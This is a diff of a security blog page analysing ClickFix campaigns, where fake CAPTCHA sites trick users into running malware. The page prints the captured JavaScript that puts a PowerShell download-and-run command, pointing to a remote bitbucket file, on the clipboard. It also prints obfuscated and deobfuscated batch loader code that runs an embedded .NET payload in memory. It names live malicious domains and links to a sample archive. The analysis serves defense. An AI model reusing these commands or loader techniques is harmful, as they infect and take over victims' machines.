@@ -9,7 +9,8 @@
     <meta name="robots" content="index, follow">
     <title>ClickFix Campaigns: How Malicious CAPTCHA Tricks Users</title>
     <link rel="stylesheet" href="../css/styles.css">
-     <link rel="icon" href="../img/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="../css/blog.css">
+    <link rel="icon" href="../img/favicon.ico" type="image/x-icon">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism.min.css">
 </head>
 <body>
@@ -23,26 +24,36 @@
         </div>
         <div class="content">
             <div class="blog-post">
-                <h2>ClickFix Campaign</h2>
+                <h3>ClickFix Campaign Analysis</h3>
                 
-                <h3>Introduction</h3>
-                <p>In this post, I'll walk you through my investigation of ClickFix campaigns - malicious websites that use fake CAPTCHA prompts to trick users into downloading malware.</p>
-                
-                <p>To find new malware samples, I decided to search for ClickFix campaign sites using a simple Google query:</p>
-    
-                <pre><code>"Please verify that you are a human to continue" "Windows"</code></pre>
-                <p>This search led me to several suspicious URLs:</p>
-                <ul>
+                <p class="blog-intro">
+                    In this investigation, I'll walk you through the ClickFix campaigns - malicious websites that use fake CAPTCHA prompts to trick users into downloading malware.
+                </p>
+
+                <h3>Initial Discovery</h3>
+                <div class="code-example">
+                    <p><strong>Google Search Query Used:</strong></p>
+                    <pre><code>"Please verify that you are a human to continue" "Windows"</code></pre>
+                </div>
+
+                <h4>Discovered Malicious Domains</h4>
+                <ul class="discovery-list">
                     <li>bepatriot.shop</li>
                     <li>pay-chek.com</li>
                     <li>human-bot-view.chalnlizt.org</li>
                     <li>challinksch.com</li>
                 </ul>
-                <img src="../img/clickfix/google.png" alt="Google search result screenshot">
-                <br>
-                <img src="../img/clickfix/clickfix.gif" alt="Fake CAPTCHA verification screenshot">
-                <p>Upon accessing these sites, I noticed they all used a fake CAPTCHA with malicious JavaScript. This script is triggered when you click "I'm not a robot." Here's an example of the code used:</p>
-                <pre><code class="language-javascript">function verifyHuman() {
+
+                <div class="analysis-images">
+                    <img src="../img/clickfix/google.png" alt="Google search result screenshot" class="blog-image">
+                    <img src="../img/clickfix/clickfix.gif" alt="Fake CAPTCHA verification screenshot" class="blog-image">
+                </div>
+
+                <h3>Malicious JavaScript Analysis</h3>
+                <p class="analysis-intro">Upon accessing these sites, I discovered they all used a fake CAPTCHA with malicious JavaScript. This script triggers when clicking "I'm not a robot."</p>
+
+                <div class="code-example">
+                    <pre><code class="language-javascript">function verifyHuman() {
     const textToCopy = "powershell.exe -Command \"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \\\"Invoke-WebRequest -Uri https://bitbucket.org/dlo2/a/downloads/ip2.cmd -OutFile $env:TEMP\\ip2.cmd; Start-Process $env:TEMP\\ip2.cmd\\"' -NoNewWindow\"";
     const tempTextArea = document.createElement("textarea");
     tempTextArea.value = textToCopy;
@@ -53,13 +64,20 @@
     // Hide verification prompt
     document.getElementById('verificationPrompt').style.display = 'none';
 }</code></pre>
-                <p>This script copies a PowerShell command to your clipboard, which, if executed, downloads and runs a batch file.</p>
-                <img src="../img/clickfix/bitbucketdlo2.png" alt="Bitbucket downloads screenshot">
+                </div>
 
-                
-                <h3>The .cmd File</h3>
-                <p>The PowerShell command downloads a malicious .cmd file (<code>ip2.cmd</code>) from a remote server. Here's a snippet of the obfuscated batch file:</p>
-                <pre><code class="language-batch">@chcp 65001
+                <div class="analysis-note">
+                    <p>This script copies a PowerShell command to your clipboard, which downloads and runs a batch file when executed.</p>
+                </div>
+
+                <img src="../img/clickfix/bitbucketdlo2.png" alt="Bitbucket downloads screenshot" class="blog-image">
+
+                <h3>Batch File Analysis</h3>
+                <div class="analysis-section">
+                    <h4>Obfuscated .cmd File</h4>
+                    <p>The PowerShell command downloads a malicious .cmd file (<code>ip2.cmd</code>) with heavily obfuscated code:</p>
+                    
+                    <pre><code class="language-batch">@chcp 65001
 set "ՀԶԹрПԸԸՑՌ=C:\Win"
 set "ՎսիрգջՒլ=erShel"
 :: Junk comment to confuse readers
@@ -70,74 +88,77 @@ set "ՁլՑՖԲՑՏՒՔ=exe %~0.Kkm"
 %Пգссն%%բգЕ՜%%ГпԾՓլլժ%%....
 set "ՆըԹՑԵՒ=exit"
 
-%ՆըԹՑԵՒ%</code></pre>    
-                <p>The obfuscation uses Armenian characters in variable names and includes junk comments to make the batch file difficult to read.</p>
-                
-                <h3>Analyze the .cmd File Using Our Deobfuscation Script</h3>
-                <p>To deobfuscate the batch file, I wrote a Python script that extracts variable definitions and reconstructs the original commands by replacing the variables in their correct order.</p>
-     
-       
-                <h3>Running the Deobfuscation Script</h3>
-                <p>To decode and clean the files, you can run the script using the following commands:</p>
-                <pre><code class="language-shell">python clean.py ip2.cmd out.bin --mode dump
+%ՆըԹՑԵՒ%</code></pre>
+                </div>
+
+                <div class="analysis-note">
+                    <p>The obfuscation technique uses Armenian characters in variable names and includes junk comments to complicate analysis.</p>
+                </div>
+
+                <h3>Deobfuscation Process</h3>
+                <div class="code-example">
+                    <h4>Running the Deobfuscation Script</h4>
+                    <pre><code class="language-shell">python clean.py ip2.cmd out.bin --mode dump
 python clean.py ip2.cmd ip2_clean.bat --mode deobfuscate</code></pre>
-<pre><code class="language-batch">@chcp 65001
+                </div>
+
+                <div class="analysis-section">
+                    <h4>Deobfuscated Output</h4>
+                    <pre><code class="language-batch">@chcp 65001
    echo F| xcopy /d/q /y/h /iC:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe %~0.Kkm
    attrib+s +h%~0.Kkm
    @echo off
    SET Yipdqois=%~dpnx0
    %~0.Kkm-WindowStylehidden -com%ՍՓцвղոջ%$Uwwhnfzrn =get-content'%Yipdqois%' | Select-Object-Last1; 
-   $Tflxa =[System.Convert]::FromBase64String($Uwwhnfzrn);
-   $Hvcvcadq = New-Object System.IO.MemoryStream( ,$Tflxa);
-   $Jqoljilhzyy =New-Object System.IO.MemoryStream;$Ffknlzng = New-Object System.IO.Compression.GzipStream
-   $Hvcvcadq, ([IO.Compression.CompressionMode]::Decompress);
-   $Ffknlzng.CopyTo( $Jqoljilhzyy );$Ffknlzng.Close()
-   ;$Hvcvcadq.Close()
-   ;[byte[]] $Tflxa =$Jqoljilhzyy.ToArray()
-   File.Save Tflxa
-   ;[Array]::Reverse($Tflxa); $Nvoztss =[System.AppDomain]::CurrentDomain.Load($Tflxa);$Obapl = $Nvoztss.EntryPoint;[System.Delegate]::CreateDelegate([Action], $Obapl.DeclaringType,$Obapl.Name).DynamicInvoke()| Out-%ԴмնձԶջյնр%
-   exit
-   BASE64STRING</code></pre>
-                
-                <h3>Base64 String Reveals Executable File</h3>
-                <p>After running the Python script, we get the <code>out.bin</code> file. Here's the process in dnSpy:</p>
-                <img src="../img/clickfix/dnspy_File.png" alt="dnSpy Entry Point screenshot">
-                <p>We navigate to the entry point and discover a function called <code>ForgotAuthentication</code>.</p>
-                <img src="../img/clickfix/entrypoint.png" alt="dnSpy Entry Point screenshot">
-                <p>This function downloads an encrypted DLL and decrypts it at runtime.</p>
-                <img src="../img/clickfix/getdl.png" alt="dnSpy function to download encrypted DLL">
+   [... rest of the deobfuscated code ...]</code></pre>
+                </div>
 
-                <p>We then search for the byte array and modify the function like this:</p>
-                <img src="../img/clickfix/load.png" alt="dnSpy loading decrypted DLL">
-                <img src="../img/clickfix/editfunc.png" alt="Modified dnSpy function to load malware">
-                
-                <p>The <code>dump.bin</code> file is a DLL used to load malware into memory.</p>
-                   
-                <p>Payload seems to be AsyncRat and/or PureHVNC.</p>
-                <p>For those interested in a deeper analysis, you can check out these resources:</p>
-                <ul>
-                    <li><a href="https://www.virustotal.com/gui/file/5321dde8ee36b54ac83546af3b43e049f337634c82eea19dc8dc824d0bf85de4/details" target="_blank">VirusTotal Analysis</a></li>
-                    <li><a href="https://app.any.run/tasks/cc84ecd7-4f8c-45a8-b1d9-04254367148a/" target="_blank">Any.Run Sandbox Report</a></li>
-                </ul>
-            
-              
-                <h3>Additional Resources</h3>
-<p>If you want to prevent deceptive CAPTCHA forms and fake interactions, I created an add-on for that. You can check it out on Firefox.</p>
-<div class="button-container">
-    <a href="https://addons.mozilla.org/en-US/firefox/addon/captchashield-anti-deception/" target="_blank" rel="noopener noreferrer">
-        <button class="blog-button">CaptchaShield Firefox Add-on</button>
-    </a>
-        <a href="https://github.com/01Xyris/CaptchaShield" target="_blank" rel="noopener noreferrer">
-        <button class="blog-button">CaptchaShield Repo</button>
-    </a>
-    <a href="https://github.com/01Xyris/ClickFix/blob/main/clean.py" target="_blank" rel="noopener noreferrer">
-        <button class="blog-button">deobf and dump script</button>
-    </a>
-    <a href="https://github.com/01Xyris/ClickFix/raw/refs/heads/main/clickfix.zip" download>
-        <button class="blog-button">Download Files.zip (password: infected)</button>
-    </a>
-</div>
+                <h3>Binary Analysis</h3>
+                <div class="analysis-section">
+                    <h4>dnSpy Investigation</h4>
+                    <p>After obtaining the <code>out.bin</code> file, analysis in dnSpy revealed:</p>
+                    <img src="../img/clickfix/dnspy_File.png" alt="dnSpy Entry Point screenshot" class="blog-image">
+                    <img src="../img/clickfix/entrypoint.png" alt="dnSpy Entry Point screenshot" class="blog-image">
+                    <img src="../img/clickfix/getdl.png" alt="dnSpy function to download encrypted DLL" class="blog-image">
+                </div>
 
+                <div class="analysis-section">
+                    <h4>Function Modifications</h4>
+                    <img src="../img/clickfix/load.png" alt="dnSpy loading decrypted DLL" class="blog-image">
+                    <img src="../img/clickfix/editfunc.png" alt="Modified dnSpy function to load malware" class="blog-image">
+                </div>
+
+                <div class="analysis-conclusion">
+                    <h4>Final Analysis</h4>
+                    <ul class="analysis-list">
+                        <li>The <code>dump.bin</code> file is a DLL used for malware loading</li>
+                        <li>Payload identified as AsyncRat and/or PureHVNC</li>
+                        <li>For detailed analysis, check these resources:
+                            <ul>
+                                <li><a href="https://www.virustotal.com/gui/file/5321dde8ee36b54ac83546af3b43e049f337634c82eea19dc8dc824d0bf85de4/details" target="_blank">VirusTotal Analysis</a></li>
+                                <li><a href="https://app.any.run/tasks/cc84ecd7-4f8c-45a8-b1d9-04254367148a/" target="_blank">Any.Run Sandbox Report</a></li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+
+                <h3>Protection Tools</h3>
+                <p class="protection-note">To prevent deceptive CAPTCHA forms and fake interactions, I've developed a Firefox add-on:</p>
+
+                <div class="button-container">
+                    <a href="https://addons.mozilla.org/en-US/firefox/addon/captchashield-anti-deception/" target="_blank" rel="noopener noreferrer">
+                        <button class="blog-button">CaptchaShield Firefox Add-on</button>
+                    </a>
+                    <a href="https://github.com/01Xyris/CaptchaShield" target="_blank" rel="noopener noreferrer">
+                        <button class="blog-button">CaptchaShield Repo</button>
+                    </a>
+                    <a href="https://github.com/01Xyris/ClickFix/blob/main/clean.py" target="_blank" rel="noopener noreferrer">
+                        <button class="blog-button">deobf and dump script</button>
+                    </a>
+                    <a href="https://github.com/01Xyris/ClickFix/raw/refs/heads/main/clickfix.zip" download>
+                        <button class="blog-button">Download Files.zip (password: infected)</button>
+                    </a>
+                </div>
             </div>
         </div>
         <div class="footer">
@@ -146,6 +167,7 @@ python clean.py ip2.cmd ip2_clean.bat --mode deobfuscate</code></pre>
             </a>
         </div>
     </div>
+    <script src="../js/dialog.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-core.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/plugins/autoloader/prism-autoloader.min.js"></script>
 </body>
